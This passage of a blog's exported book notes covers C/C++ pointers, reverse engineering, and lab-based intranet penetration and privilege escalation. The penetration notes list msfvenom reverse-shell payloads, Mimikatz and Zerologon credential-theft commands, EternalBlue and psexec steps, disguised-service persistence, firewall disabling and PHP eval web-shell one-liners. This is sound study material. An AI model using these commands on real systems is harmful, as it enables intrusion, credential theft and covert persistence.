printf(&quot;\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;ptr[%d] = %d\\n&quot;, i, ptr[i]);            printf(&quot;\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;*(ptr+%d) = %d\\n&quot;, i, *(ptr+i));    return 0;&#125;\nChapter.4 - Pointer And Function4.2 - swap4.4 - Pointer To Function#include &lt;stdio.h&gt;int add(int, int);int substract(int, int);int multiply(int, int);int divide(int, int);int (*operation)(int, int);int main()&#123;    int x, y, output;    printf(&quot;Enter x and y: &quot;);    scanf(&quot;%d %d&quot;, &amp;x, &amp;y);    operation = add;    output = (*operation)(x, y);    printf(&quot;%d + %d = %d\\n&quot;, x, y, output);        operation = substract;    output = (*operation)(x, y);    printf(&quot;%d - %d = %d\\n&quot;, x, y, output);        operation = multiply;    output = (*operation)(x, y);    printf(&quot;%d * %d = %d\\n&quot;, x, y, output);        operation = divide;    output = (*operation)(x, y);    printf(&quot;%d / %d = %d\\n&quot;, x, y, output);        return 0;&#125;int add(int a, int b)&#123;    return a + b;&#125;int substract(int a, int b)&#123;    return a - b;&#125;int multiply(int a, int b)&#123;    return a * b;&#125;int divide(int a, int b)&#123;    return a / b;&#125;\nOutput:Enter x and y: 10 210 + 2 = 1210 - 2 = 810 * 2 = 2010 / 2 = 5\n4.5 - Function Returns a Pointer\nChapter.5 - Pointer And StringChapter.6 - Pointer And StructChapter.7 - Linked ListChapter.8 - BSTChapter.9 - Pointer And FilePart II - C++Chapter.10 - Reference10.1 - Variable and ReferenceIn C, there are only pointers; it does not have the concept of reference like C++.#include &lt;iostream&gt;using namespace std;int main()&#123;    int k = 100;    int &amp;r = k;    int *p = &amp;k;        cout &lt;&lt; &quot;&amp;k=&quot; &lt;&lt; &amp;k &lt;&lt; endl;    cout &lt;&lt; &quot;&amp;r=&quot; &lt;&lt; &amp;r &lt;&lt; endl;    cout &lt;&lt; &quot;&amp;p=&quot; &lt;&lt; &amp;p &lt;&lt; endl;    cout &lt;&lt; &quot;p=&quot; &lt;&lt; p &lt;&lt; endl &lt;&lt; endl;        cout &lt;&lt; &quot;k=&quot; &lt;&lt; k &lt;&lt; endl;    cout &lt;&lt; &quot;r=&quot; &lt;&lt; r &lt;&lt; endl;    cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl &lt;&lt; endl;        r++;        cout &lt;&lt; &quot;k=&quot; &lt;&lt; k &lt;&lt; endl;    cout &lt;&lt; &quot;r=&quot; &lt;&lt; r &lt;&lt; endl;    cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl &lt;&lt; endl;        k++;        cout &lt;&lt; &quot;k=&quot; &lt;&lt; k &lt;&lt; endl;    cout &lt;&lt; &quot;r=&quot; &lt;&lt; r &lt;&lt; endl;    cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl &lt;&lt; endl;    return 0;&#125;Output:&amp;k=0x7ffd0d5ca174&amp;r=0x7ffd0d5ca174&amp;p=0x7ffd0d5ca168p=0x7ffd0d5ca174k=100r=100*p=100k=101r=101*p=101k=102r=102*p=102\n10.2 - swapIn C, we implement swap() with pointers. In C++, we are allowed to implement it with reference:#include &lt;iostream&gt;using namespace std;void swap_by_address(int *x, int *y);void swap_by_reference(int &amp;, int &amp;y);void swap_by_value(int, int); //Just for demonstration, this method cannot do swapping!int main()&#123;    int x = 100, y = 200;        //Call by address    x = 100; y = 200;    cout &lt;&lt; &quot;Call by value&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;Before swapping...&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl;    swap_by_value(x, y);    cout &lt;&lt; &quot;After swapping...&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl &lt;&lt; endl;        //Call by address    x = 100; y = 200;    cout &lt;&lt; &quot;Call by address&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;Before swapping...&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl;    swap_by_address(&amp;x, &amp;y);    cout &lt;&lt; &quot;After swapping...&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl &lt;&lt; endl;        //Call by reference    x = 100; y = 200;    cout &lt;&lt; &quot;Call by reference&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;Before swapping...&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl;    swap_by_reference(x, y);    cout &lt;&lt; &quot;After swapping...&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; endl &lt;&lt; endl;    return 0;&#125;void swap_by_value(int a, int b)&#123;    int temp;    temp = a;    a = b;    b = temp;&#125;void swap_by_address(int *a, int *b)&#123;    int temp;    temp = *a;    *a = *b;    *b = temp;&#125;void swap_by_reference(int &amp;a, int &amp;b)&#123;    int temp;    temp = a;    a = b;    b = temp;&#125;Output:Call by valueBefore swapping...x=100, y=200After swapping...x=100, y=200Call by addressBefore swapping...x=100, y=200After swapping...x=200, y=100Call by referenceBefore swapping...x=100, y=200After swapping...x=200, y=100\nChapter.11 - this PointerChapter.12 - new and delete12.1 - new, delete and variableusing namespace std;int main()&#123;    int *p = (int *)malloc(sizeof(int));    //int *p = new int;    *p = 200;    cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl;    delete p;        return 0;&#125;\nOutput:\n*p=200You CANNOT do this:#include &lt;iostream&gt;using namespace std;int main()&#123;    int k = 100;    int *p = &amp;k;    cout &lt;&lt; &quot;*p=&quot; &lt;&lt; *p &lt;&lt; endl;    delete p;        return 0;&#125;Output:main.cpp: In function ‘int main()’:main.cpp:18:12: warning: ‘void operator delete(void*)’ called on unallocated object ‘k’ [-Wfree-nonheap-object]   18 |     delete p;      |            ^main.cpp:15:9: note: declared here   15 |     int k = 100;      |         ^*p=100free(): invalid pointerSince the variable k is in stack, rather than heap.\n12.2 - new, delete and ArrayChapter.13 - copy ConstructorChapter.14 - Virtual Function, Pointer And ReferenceChapter.15 - Linked ListPart III - JavaPart IV - CPart V - Python\n","categories":["Book"],"tags":["Book","Learning","Note","Code","Programming","C++","Python","Coding","Program","C","Java","Pointer","Reference"]},{"title":"[Book] Intranet Penetration Practice Strategy","url":"/2026/01/02/2026-1-2-NoteLanPenetrationGuidelines/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Intranet Penetration Practice Strategy”.The content will be continuously updated as I read through the book.\nReflectionThis book first introduces fundamental knowledge and tools of intranet penetration testing.It then demonstrates practical approaches to penetration testing using the provided experimental enviroment.The following topics are covered:\n\nCobalt Strike\nWeb penetration.\nSpreading payload(virus) in intranet.\nConfrontation of Anti-Virus.\nPost-Exploitation Persistence.\nPTH(Pass-the-Hash).\n\nWhile the book covers a wide range of post-exploitation techniques, it does not delve into the underlying principles behind these tools.As a result, readers without a solid foundational background may struggle to fully understand certain features, such as the autoroute mechanism in Meterpreter, and Socks5 proxy.\nChapter.1 - Fundamental of Intranet Penetration\nWORKGROUP\nDomain\nAD (Active Directory)\n\n&gt; systeminfo...Domain: WORKGROUP...\n&gt; systeminfo...Domain: SomeDomain.org...\nChapter.3 - Environment Setting-Up and Useful Tools3.2 - Port Discovery&gt; nmap -sC -sV -v -A &lt;TargetIP&gt;\n\n-sC: Performs a script scan using the default set of safe scripts from the Nmap Script Engine (NSE).\n-sV: Enables version detection.\n-v: Verbose, show more information.\n-A: Enable OS detection, version detection, script scanning, and traceroute.\n\n3.4 - Buster ToolsDirBusterSNETCrackerdirsearchhttps://github.com/maurosoria/dirsearch&gt; python dirsearch.py -u &lt;Target URL&gt; -e all\nJWTPyCrackhttps://github.com/Ch1ngg/JWTPyCrack&gt; python jwtcrack.py -m blasting -s jwt --kf &lt;KeyFile&gt;\ntgsrepcrack&gt; python tgsrepcrack.py &lt;Dictionary File&gt; &lt;Ticket File&gt;\n3.10 - Post-ExploitationMsfvenomWindows Payload&gt; msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 lhost=192.168.0.1 port=4444 -f exe -o /tmp/shell.exeEncoded Windows Payload&gt; msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -i 3 -e x86/shikita_ga_nai lhost=192.168.0.1 port=4444 -f exe -o /tmp/shell.exe\nLinux Payload&gt; msfvenom -p linux/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f elf &gt; /tmp/shell.elf\nmacOS Payload&gt; msfvenom -p osx/x86/shell_reverse_tcp lhost=192.168.0.1 port=4444 -f macho &gt; /tmp/shell.macho\nPHP Payload&gt; msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f raw\nASP Payload&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f asp\nASPX Payload&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f aspx\nJSP Payload&gt; msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.0.1 port=4444 -f raw\nWAR Payload&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f war\nBash Payload&gt; msfvenom -p cmd/unix/reverse_bash lhost=192.168.0.1 port=4444 -f bash\nPerl Payload&gt; msfvenom -p cmd/unix/reverse_perl lhost=192.168.0.1 port=4444 -f raw\nPython Payload&gt; msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.0.1 port=4444 -f raw\nMimikatzmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; password.txt\nprivilege::debugtoken::elevate\nmimikatz # ts::sessionsmimikatz # ts::remote /id:1\n# Testing Zerologon Exploitlsadump::zerologon /target:DC.domain.com /account:DC$# Exploit Zerologonlsadump::zerologon /target:DC.domain.com /account:DC$ /exploit# Clear DC password and extract authenticationslsa::dcsync /domain:domain.com /dc:DC.domain.com /user:administrator /authuser:DC$ /authdomain:domain /authpassword:&quot;&quot; /authntlm# Redo clear admin passwordlsadump::postzerologon /trget:domain.com /account:DC$\nChpater.4 - Vulnstack1: Spreading Through Domain’s AccountPersistenceCobalt Strikebeacon&gt; shell sc screate &quot;WindowsUpdate&quot; binpath=&quot;cmd /c start &quot;C:\\Users\\Administrator\\Desktop\\Artificat.exe&quot;&quot;&amp;&amp;sc config &quot;WindowsUpdate&quot; start=auto&amp;&amp;net start WindowsUpdate\nChapter.5 - Vulnstack2: Confronting Anti-VirusChapter.6 - Vulnstack3: Obtain DC privilege through PTHDiscoveryrun autorun -s 192.168.93.0/24backgrounduse auxiliary/server/socks_proxyset SRVPORT 6677run\nSpreadinguse auxiliary/scanner/smb/smb_loginset rhost 192.168.93.30set SMBUSER administratorset PASS_FILE /root/passwd.txtrun\nuse exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhosts 192.168.93.30set smbuser administratorset smbpass 123qwe!ASD\nsysteminfo\n\nChapter.7 - Vulnstack4: Docker Escape/Container BreakoutAttack and Exploitation StageAfter getshell:&gt; find / -name .dockerenv\nCDK\nhttps://github.com/cdk-team/CDKchmod +x cdk./cdk evaluate --fullSYS_ADMIN./cdk run mount-disk\n\nssh-keygen -t rsals /root/.ssh/cat /root/.ssh/id_rsa.pub\nDirtyCow\nhttps://github/com/firefart/dirtycow\n\nunzip dirtycow-master.zipcd dirtycow-mastergcc -pthread dirty.c -o dirty -lcryptchmod +x dirty./dirty 123456\nCheck if the account firefart exists.cat /etc/passwd\n\nConfig intranet proxy with metasploitifconfigmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.150.188 LPORT=12345 -f elf &gt; 123456.elf\nmsfconsoleuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.150.188set LPORT 12345run\nchmod +x 12345.elf./12345.elf\nmeterpreter&gt; routemeterpreter&gt; run autoroute -s 192.168.96.0/24meterpreter&gt; run autoroute -s 192.168.183.0/24meterpreter&gt; backgroundmsf&gt; use auxiliary/server/socks_proxymsf&gt; show optionsmsf&gt; exploit\nuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcpset rhost 192.168.183.130run\nrun post/windows/gather/smart_hashdump\nuse exploit/windows/smb/psexecset payload windows/x64/meterpreter/bind_tcpset rhosts 192.168.183.129msf&gt; set SMBUser TESTWIN7-PCmsf&gt; set SMBPassmsf&gt; run\nPersistence and Recovery Stagemsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.210.111 LPROT=17918 -f elf &gt; 17918.elf\nchmod +x 17918.elf\nvim /var/spool/cron/crontabs/root\nChapter.8 - Vulnstack5: Using PsExec to Exploit a DC With NO Internet AccessDiscovery and Spreadingcertutil.exe -urlcache -split -f http://x.x.x.x/payload.exe\nbeacon&gt; shell netsh firewall show statebeacon&gt; shell advfirewall set allprofiles state off\nPersistence and Recoverybeacon&gt; shell sc config &quot;windows update&quot; start=autobeacon&gt; shell sc description &quot;windows update&quot; &quot;Windows patch&quot;beacon&gt; shell net start &quot;windows update&quot;beacon&gt; \n\nChapter.9 - Exploiting Zerologon and Obtain DC’s Privilege\nChapter.10 - Penetrating Multi-Level Intranet With Different Service Exploitation\nChapter.11 - Obtain DC’s Privilege Through SPN","categories":["Book"],"tags":["Book","Learning","Note","Blackhat","Hacking","Hack","LAN","Domain","Penetration","Pentest"]},{"title":"[Book] Privilege Escalation - Offensive and Defensive Tactics and Techniques","url":"/2026/01/02/2026-1-2-NotePrivilegeEscalationTechnique/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Privilege Escalation - Offensive and Defensive Tactics and Techniques”.The content will be continuously updated as I read through the book.\nReflectionChapter.1 - Fundamentals1.2 - Windows Privilege EscalationLocal User And Local Groupcmd:&gt; net userUser accounts for \\\\DESKTOP-NKNBEK2-------------------------------------------------------------------------------Administrator            DefaultAccount           Guestsdksdk                   WDAGUtilityAccountThe command completed successfully.\nPowerShellPS &gt; Get-LocalUserName               Enabled Description----               ------- -----------Administrator      False   Built-in account for administering the computer/domainDefaultAccount     False   A user account managed by the system.Guest              False   Built-in account for guest access to the computer/domainsdksdk             TrueWDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...\nlusrmgr.msc\n\n&gt; net user &lt;Username&gt; &lt;Password&gt; /add&gt; net user &lt;Username&gt; /del\n\nLocal Group&gt; net localgroupAliases for \\\\DESKTOP-NKNBEK2-------------------------------------------------------------------------------*Access Control Assistance Operators*Administrators*Backup Operators*Cryptographic Operators*Device Owners*Distributed COM Users*Event Log Readers*Guests*Hyper-V Administrators*IIS_IUSRS*Network Configuration Operators*Performance Log Users*Performance Monitor Users*Power Users*Remote Desktop Users*Remote Management Users*Replicator*System Managed Accounts Group*UsersThe command completed successfully.&gt; Get-LocalGroupName                                Description----                                -----------Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...Administrators                      Administrators have complete and unrestricted access to the computer/domainBackup Operators                    Backup Operators can override security restrictions for the sole purpose of back...Cryptographic Operators             Members are authorized to perform cryptographic operations.Device Owners                       Members of this group can change system-wide settings.Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...Event Log Readers                   Members of this group can read event logs from local machineGuests                              Guests have the same access as members of the Users group by default, except for...Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...IIS_IUSRS                           Built-in group used by Internet Information Services.Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...Performance Monitor Users           Members of this group can access performance counter data locally and remotelyPower Users                         Power Users are included for backwards compatibility and possess limited adminis...Remote Desktop Users                Members in this group are granted the right to logon remotelyRemote Management Users             Members of this group can access WMI resources over management protocols (such a...Replicator                          Supports file replication in a domainSystem Managed Accounts Group       Members of this group are managed by the system.Users                               Users are prevented from making accidental or intentional system-wide changes an...\nUseful group during penetration testing:\n\nAdministrators\nPower Users\nUsers\nGuests\nTrustedInstaller\nAuthenticated Users\n\nBuilt-in Account\n\nLocal System:This account has the greatest power before Windows XP, it is able to modify file system, registry, task, Windows Installer, Windows Update, etc. However, Microsoft separated it, nowadays, the account with greatest pwoer is TrustedInstaller.\nLocal Service\nNetwork Service\n\nUseful Command:| cmd | PowerShell | Description || —- | —- | —- || net user | Get-LocalUser | View local users. || net localgroup | Get-LocalGroup | View local groups. || net user  | Get-LocalGroup -Name  | Select-Object * | View user’s properties. || net localgroup  | Get-LocalGroupMember  | View users in the group. || net user   /add | $password=Read-Host -AsSecureString New-LocalUser “username” -Password $password | Add new user. || net localgroup   /add | Add-LocalGroupMember - Group ‘‘ -Member (‘‘) | Add user into the group. || net user  /del | Remove-LocalUser -Name  | Delete user. || net user   | $password=Read-Host -AsSecureString Set-LocalUser -Name  -Password $password | Change user’s password |\nACL (Access Control List)\n\n\n\nTerm\nMeaning\n\n\n\n\nSecurity Descriptor\nDescribe the information of Security Object, like SID, DACL, SACL, etc.\n\n\nSecurity Object\nObject with Security Descriptor, like file, directory, registry, process, thread, pipe, etc.\n\n\nACL\nAccess Control List\n\n\nACE\nAccess Control Entries\n\n\nDACL\nDiscretionary Access Control List\n\n\nSACL\nSystem Access Control List\n\n\ntrustees\nAccount, group, login session, etc.\n\n\n\n\nSecurity Descriptor\nView SID of current user:&gt; whoami /user\nView SID of all users:\n&gt; wmic useraccount get name,sid\n S-R-X-Y1-Y2-Yn-1-Yn:\n\nS: Indicates that the string is a Security Identifier(SID).\nR: Indicates the revision level.\nX: Indicates the identifier authority value.\nY: Represents a series of subauthority values, where n is the number of values.\n\nThe first part of the series(-Y1-Y2-Yn-1) is the domain identifier. This element of the SID becomes significant in an enterprise with several domains. No two domains in an enterprise share the same domain identifier.\nThe last item in the series of subauthority values(-Yn) is the RID. It distinguishes one account or group from all other accounts and groups in the domain. Now two accounts or groups in any domain share the same RID.\n\n\nEveryone: S-1-1-0\n\nBUILTIN\\Administrators: S-1-5-32-544, built-in adminsitrator group.\nBUILTIN\\Users: S-1-5-32-545, built-in user group.\nNTAUTHORITY\\INTERACTIVE: S-1-5-4, group of users which login whith interactive.\nNTAUTHORITY\\AuthenticatedUsers: S-1-5-11, authenticated users.\nLocalService: S-1-5-19\nNetworkService: S-1-5-20\nLocalSystem: S-1-5-18\n\n\n\nAuthentication\nwinlogon.exe\nlsass.exe\nSAM: Security Account Manager, /system32/config, HKEY_LOCAL_MACHINE\n\nTokenAn access token is an object that represents the security context of a process or thread.\nA session is created after the user is successfully authenticated and logs in. The Windows system then determines the user’s SID and the SIDs of the groups to which the user belongs. Subsequently, the Local Security Authority (LSA) creates an access token for the user.\nAn access token contains the user’s SID, group SIDs, session ID, privileges, the default DACL, the token type, and other attributes.\nThe access token is assigned to userinit.exe, whose path is stored in the registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.\nuserinit.exe is responsible for initializing the user’s environment, such as executing logon scripts, establishing network connections, and launching startup applications. It then reads the value of Shell, which is explorer.exe by default, and launches it as the Windows graphical user interface.\nAfter that, all child processes and threads inherit the access token of their parent process—explorer.exe—unless a process explicitly specifies a different token. Initially, most processes share the same access token.\nToken has two types:\n\nPrimary Token\nImpersonation Token\n\nSeparation of Privilege&gt; whoami /priv\n&gt; gpedit.msc\nPS&gt; Enable-Privilege -Privilege SeBackupPrivilege\n\n\n\n\nCommand\nFunction\n\n\n\n\nEnable-Privilege -Privilege &lt;Privilege’s name&gt;\nEnable privilege\n\n\nDisable-Privilege -Privilege &lt;Privilege’s name&gt;\nDisable privilege\n\n\nAdd-Privilege -Privilege &lt;Privilege’s name&gt;\nAdd privilege\n\n\nRemove-Privilege -Privilege &lt;Privilege’s name&gt;\nRemove privilege\n\n\nGet-Privilege -CurrentUser\nView privilege of current user\n\n\n\n\nWindows Hash\nLM Hash\nNTLM Hash\n\nUACUAC (User Account Control)\nWindows ServiceRegistryData type:\n\nREG_SZ\nREG_MULTI_SZ\nREG_BINARY\nREG_DWORD\n\n\n\n\n\nHive\nAbbreviation\nDescription\n\n\n\n\nHKEY_CLASSES_ROOT\nHKCR\nFile associations and COM object registration.\n\n\nHKEY_CURRENT_USER\nHKCU\nSettings for the currently logged-in user.\n\n\nHKEY_LOCAL_MACHINE\nHKLM\nSystem-wide configuration for the entire machine.\n\n\nHKEY_USERS\nHKU\nAll user registry hives currently loaded.\n\n\nHKEY_CURRENT_CONFIG\nHKCC\nCurrent hardware profile.\n\n\n\n\n1.3 - Linux Privilege EscalationUser\nRoot User(Super User)\nRegular User\nSystem User\n\nUser GroupUser Configuration Files\n\n\n\nFile\nMeaning\n\n\n\n\n/etc/passwd\nUsers and their properties (such as, name, uid, group id).\n\n\n/etc/shadow\nUsers’ password and properties.\n\n\n/etc/group\nGroups and their properties.\n\n\n/etc/gshadow\nGroups’ and their properties.\n\n\n\n\n\n  \n    Source: https://infosecwriteups.com/what-is-etc-passwd-group-shadow-file-in-linux-bd7b28f353f3\n  \n\n\n\n\n\n  \n    Source: https://linuxopsys.com/etc-shadow-file-explained\n  \n\n\n\n\n\n  \n    Source: https://dpcvirtualtips.com/working-with-local-users-and-groups-on-rhel/\n  \n\n\n\n\n  \n    Source: https://ashutoshlinuxnotes.blogspot.com/p/user-and-group-permission.html\n  \n\n\n\n\nChapter.2 - Environment Setting-up and Tools2.2 - Kali LinuxMetasploit&gt; sudo msfconsole\n&gt; sudo msfdb status\n&gt; sudo msfdb init\nmsf&gt; db_status\nmsf&gt; search privilege escalation platform:windows type:exploit\nCobalt StrikeEmpire 42.3 - PowerShell2.4 - WinPEAs2.5 - PowerUp and SharpUp2.6 - Accesshk2.7 - cacls and icaclsChapter.3 - File Action3.1 - WindowsCreate/Write File\ncmd\nWrite file with set:  set /p=&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&lt;nul&gt;c:\\1.php\nWrite file with echo:  echo ^&lt;?php @eval($_POST[&#x27;hello&#x27;])?&gt;&gt;c:\\2.php\nAppending with echo:echp ok&gt;&gt;c:\\2.php\nAppending without new line:set /p=&quot;222&quot;&gt;&gt;c:\\1.php\nOverwrite:echo ok&gt;c:\\2.php\nWrite file with echo without space:echo.^&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&gt;c:\\3.phpecho,^&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&gt;c:\\3.php\nCreate empty file:cd.&gt;12.txtcopy nul 12.txttype nul&gt;12.txtfsutil file createnew c:\\12.txt 0\ncopy filetype 1.php &gt; ok.phpcopy 1.php ok.php\nmove filemove c:\\1.txt d:\\\n\n\nPowerShell\n\nRead FileDownload File\nPowerShell\nPHP\nPython\nVBS\nbitsadmin\ncertutil\n\nCompress/Decompress File\nmakecab/expand\nWinRAR\n7-Zip\nBandiZip\nPowerShell\n\n3.2 - LinuxChapter.4 - Windows Information Enumeration4.1 - Server Information EnumerationSystem Version&gt; ver\nArchitecture&gt; wmic os get osarchitecture\n&gt; echo %PROCESSOR_ARCHITECTURE%\nService Information&gt; sc query state=all\n&gt; wmic service list brief\nPS&gt; Get-WmiObject win32_service | select Name,PathName\nTask&gt; tasklist\n&gt; tasklist /svc\n&gt; wmic process list brief\nPS&gt; ps\nPS&gt; Get-WmiObject -Query &quot;select * from Win32_Process&quot; | where &#123;$_.Name -notlike &quot;svchost*&quot;&#125; | select Name, Handle, @&#123;Label=&quot;Owner&quot;;Expression=&#123;$_.GetOwner().User&#125;&#125; | ft -AutoSize\nDriver Information&gt; driverquery\nDisk Informationwmic logicaldisk get caption,description,providername\ntree d:\\ &gt;C:\\tree.txt\ndir /s d:\\ &gt;C:\\file.txt\nHotfix&gt; \nPS&gt; \nPS&gt; \n4.2 - Network Information Enumeration4.3 - User’s Information Enumeration4.4 - Anti-Virus Information EnumerationChapter.5 - Windows Password ActionChapter.6 - Unsafe Windows System ConfigurationChapter.7 - Windows System Exploitation and Privilege EscalationChapter.8 - Linux Information Enumeration","categories":["Book"],"tags":["Book","Learning","Note","Blackhat","Hacking","Hack","LAN","Domain","Penetration","Pentest","PrivilegeEscalation","Privilege"]},{"title":"[Book] Web Security From White Hat (Second Edition)","url":"/2026/01/02/2026-1-2-NoteWebSecurityFromWhiteHat/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Web Security From White Hat (Second Edition)”.The content will be continuously updated as I read through the book.\nReflectionChapter.2 - HTTP And Web ApplicationChapter.3 - Browser SecurityChapter.4 - Cookie And Session SecurityChapter.5 -Chapter.6 - XSSChapter.7 - CSRFChapter.8 - Click HijackingChapter.9 - Mobile Web SecurityChapter.10 - Injection AttackChapter.11 - File ModifyingChapter.12 - SSRFChapter.13 - AuthenticationChapter.14 - Access ControlChapter.15 - CryptographyChapter.16 - API SecurityChapter.17 - Logical SecurityChapter.18 - Language SecurityChapter.19 - Server Side Safe ConfigurationChapter.20 - Proxy And CDN SecurityChapter.21 - Denial Of Service Of Application LevelChapter.22 - WebSpider","categories":["Book"],"tags":["Book","Learning","Note","Hacking","Hack","Penetration","Pentest","WebSecurity","Security","CyberSecurity","Studying","PHP","ASP","ASPX","JSP"]},{"title":"[Book] Encrypting and Decrypting a Software","url":"/2026/01/23/2026-1-23-SoftwareCrypto/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Encrypting and Decrypting a Software”.The content will be continuously updated as I read through the book.\nReflectionThis book covers many topics and has almost 1,000 pages.\n\n\n\nThe book includes the following topics:\n\nSoftware cracking (patching and bypassing)\nMathematical cryptography (with formulas and expressions)\nSoftware vulnerabilities (stack buffer overflow and heap buffer overflow)\nSoftware packing, unpacking, and packer stubs\nReverse engineering\n\nMost of the topics focus on Windows rather than Linux.\nPersonally, I do not recommend this book for beginners in reverse engineering. Although the topics are broad, the book does not explore them in great depth. While the book introduces a wide range of topics, some of them could benefit from more detailed explanations, which may make the book less accessible to beginners.\nThere are several typos in the book, such as misusing the terms byte and bit, which was quite confusing.\nThe biggest drawback is that the example source code is very difficult to obtain for foreign readers. It would be excellent if the authors uploaded their source code to GitHub, similar to the author of Reverse Engineering Core.\nOn the other hand, since the book covers many topics, it can be used as a reference or dictionary. In addition, it includes some topics that are rarely discussed in other books.\nChapter 1 - Fundamental Knowledge1.3 - Windows OSWin32 API\nKernel (kernel32.dll): Processes, threads, memory, file IO, etc.\nUser (user32.dll): Mouse click, keyboard input, window, menu, etc.\nGDI (gdi32.dll): Display text.\nadvapi32.dll\ncomctl32.dll\ncomdlg32.dll\nshell32.dll\nnetapi32.dll\n\nFor Win32 API functions, “A” stands for ANSI. “W” stands for Widechars(Unicode).\nint MessageBox(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);\nWOW64WOW64 stands for Windows on Windows 64-bit.\nWindows Message MechanismSendMessage()LRESULT SendMessage(    HWND hWnd,    UINT Msg,    WPARAM wParam,    LPARAM lParam);\nWM_COMMANDWM_COMMAND    wNotifyCode = HIWORD(wParam);    wID = LOWORD(wParam);    hwndCtl = (HWND)lParam;\nWM_GETTEXTWM_GETTEXT    wParam = (WPARAM)cchTextMax;    lParam = (LPARAM)lpszText;\nWM_QUITWM_QUIT    nExitCode = (int)wParam;\nWM_LBUTTONDOWNWM_LBUTTONDOWN    fwKeys = wParam;    xPos = LOWORD(lParam);    yPos = HIWORD(lParam);\nVirtual MemoryChapter 2 - Dynamic Analysis2.1 - OllyDbgBreakPoint\nINT 3  004013A5 CC D0404000\nOllyDbg replaces the original instruction to 0xCC. However, the original instruction in displayed.\nHardware BreakPointHardware break points are implemented with DRx registers. The addresses of break points are stored into DR0 ~ DR3, while DR7 stores the status. Thus, the maximum number of hardware break points are is 4.\n \n \n\n \n \n\n \n \n\n \n \n\n \n \n\n \n \n\nMemory BreakPoint\n\nOn Access\nOn Write\n\n\n\n\n\nSet break-on-access\n \n \n\nMessage BreakPoint\n\nView -&gt; Windows\nMessage breakpoint on ClassProc\n\n\n\n\n\n\n\n\nConditional BreakPoint\n \n \n Shift+F2\n \n \nConditional Log\n\n2.3 - MDebug2.4 - WinDbgChapter 3 - Static Analysis3.2 - Disassembly Engine\nODDisasm\nBeaEngine\nUdis86\nCapstone\nAsmJit\nKeystone\n\n3.3 - Static DisassemblyIDA\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHexadecimal Tools\nHexWorkship\nWinHex\nHiew\n\nChapter 4 - Reverse Engineering Techniques4.1 - Reverse Engineering on x32 PlatformCalling ConventionExample1:test1(p1, p2, p3);\n__cdeclpush p3     ; right to leftpush p2push p1call test1add esp,0C  ; stack cleanup\npascalpush p1     ; left to rightpush p2push p3call test1  ; stack cleanup in the function\nstdcallpush p3     ; right to leftpush p2push p1call test1  ; stack cleanup in the function\n\nExample2:test2(p1, p2);\nstdcallpush p2                         ; Parameter 2push p1                         ; Parameter 1call test2&#123;    push ebp                    ; Original EBP pointer    mov ebp, esp                ; New EBP pointer    mov eax, dword ptr[ebp+0C]  ; Parameter 2    mov ebx, dword ptr[ebp+08]  ; Parameter 1    sub esp, 8                  ; Reserve space for local variables    ...    add esp, 8                  ; Release space of local variables    pop ebp                     ; Original EBP pointer    ret 8                       ; return (Equal to ret # add esp, 8)                                ; 2 (Parameter) x 4h = 8&#125;\n\nenter: push ebp # mov ebp,esp # sub 